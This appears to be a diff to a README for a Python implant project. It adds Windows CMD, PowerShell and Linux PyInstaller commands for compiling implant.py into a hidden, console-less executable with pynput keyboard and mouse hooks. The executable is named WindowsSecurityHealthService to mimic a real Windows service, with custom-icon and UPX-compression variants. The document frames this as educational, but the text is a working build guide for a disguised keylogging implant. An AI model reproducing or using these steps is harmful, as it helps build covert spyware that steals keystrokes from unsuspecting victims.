@@ -339,7 +339,34 @@ pip install --user -r requirements.txt
 
 ## 🔨 Building the Implant
 
-### Recommended build command:
+> ⚠️ **IMPORTANT**: The build commands are different for **Windows** and **Linux**.
+> Using the wrong format will produce a broken file without the `.exe` extension!
+
+---
+
+### 🪟 Windows (CMD — Recommended)
+
+Copy-paste this **entire single line** into CMD:
+
+```cmd
+pyinstaller --onefile --noconsole --name WindowsSecurityHealthService --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 implant.py
+```
+
+### 🪟 Windows (PowerShell)
+
+In PowerShell, use **backtick** (`` ` ``) for line breaks — NOT backslash `\`:
+
+```powershell
+pyinstaller --onefile --noconsole `
+  --name WindowsSecurityHealthService `
+  --hidden-import=pynput.keyboard._win32 `
+  --hidden-import=pynput.mouse._win32 `
+  implant.py
+```
+
+### 🐧 Linux (Bash)
+
+On Linux/Mac, use backslash `\` for line breaks:
 
 ```bash
 pyinstaller --onefile --noconsole \
@@ -349,29 +376,25 @@ pyinstaller --onefile --noconsole \
   implant.py
 ```
 
-### With a custom icon:
-```bash
-pyinstaller --onefile --noconsole \
-  --name WindowsSecurityHealthService \
-  --icon=myicon.ico \
-  --hidden-import=pynput.keyboard._win32 \
-  --hidden-import=pynput.mouse._win32 \
-  implant.py
+---
+
+### With a custom icon (Windows CMD):
+```cmd
+pyinstaller --onefile --noconsole --name WindowsSecurityHealthService --icon=myicon.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 implant.py
 ```
 
-### With UPX compression:
-```bash
-pyinstaller --onefile --noconsole \
-  --name WindowsSecurityHealthService \
-  --upx-dir=/path/to/upx \
-  --hidden-import=pynput.keyboard._win32 \
-  --hidden-import=pynput.mouse._win32 \
-  implant.py
+### With UPX compression (Windows CMD):
+```cmd
+pyinstaller --onefile --noconsole --name WindowsSecurityHealthService --upx-dir=C:\upx --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 implant.py
 ```
 
-**Output**: `dist/WindowsSecurityHealthService.exe`
+---
+
+**Output**: `dist\WindowsSecurityHealthService.exe`
 
 > **Why `WindowsSecurityHealthService`?** The name mimics a legitimate Windows service. This is for educational purposes — to demonstrate how real malware blends in.
+
+> 🔴 **If your output file has NO `.exe` extension**, you used the Linux `\` command on Windows. Delete it and re-run using the **Windows CMD** single-line command above.
 
 ---
 
